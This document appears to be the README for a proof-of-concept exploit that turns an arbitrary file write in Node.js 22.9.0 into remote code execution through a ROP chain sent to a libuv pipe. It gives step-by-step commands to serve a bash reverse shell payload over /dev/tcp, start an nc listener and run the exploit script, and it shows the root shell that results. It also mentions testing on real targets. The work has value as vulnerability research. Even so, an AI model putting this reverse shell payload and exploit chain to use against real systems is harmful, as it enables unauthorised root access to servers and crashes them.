# NodeJS File Write to RCE PoC

[Sonar Research: Why Code Security Matters - Even in Hardened Environments](https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/)

Stefan Schiller, a researcher at Sonar, discovered a way to abuse an **arbitrary file write** vulnerability on a **read-only filesystem**. By sending fake structures to an open file descriptor which is a pipe to "libuv", they were able jump to an arbitrary location.

Because `node` is often compiled without PIE (Position Independent Executable), the `.text` section is not randomized with ASLR, giving us predictable addresses to jump to. They found one gadget to start a ROP chain, which I expanded to a full chain that sends a reverse shell.

## Running

This exploit was specifically made for the latest version of node as of writing, **version 22.9.0**. Almost any other version will have different addresses and memory, resulting in a **crash**. Using GDB, the exploit script needs to be tweaked in this case.

> [!WARNING]  
> Any exploit attempt will crash the server, also after exiting the reverse shell. Keep this in mind while testing on real targets.

1. Start the vulnerable application inside [`app/`](app/) on port :8000

```sh
docker compose up --build
```

2. Set up an HTTP server with the `sh` payload

```shell
$ cd exploit/
$ nano index.html
bash -c 'bash -i >& /dev/tcp/host.docker.internal/1337 0>&1'
$ python3 -m http.server 1338
```

3. In case of a reverse shell in `http/index.html`, set up a listener

```sh
nc -lnvp 1337
```

4. Trigger the exploit using a ROP chain

```sh
cd exploit/
python3 main.py
```

Enjoy your reverse shell in `nc`!

```shell
Listening on 0.0.0.0 1337
Connection received on 192.168.96.1 61726
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@694a4b7f7419:/app# id
uid=0(root) gid=0(root) groups=0(root)
```
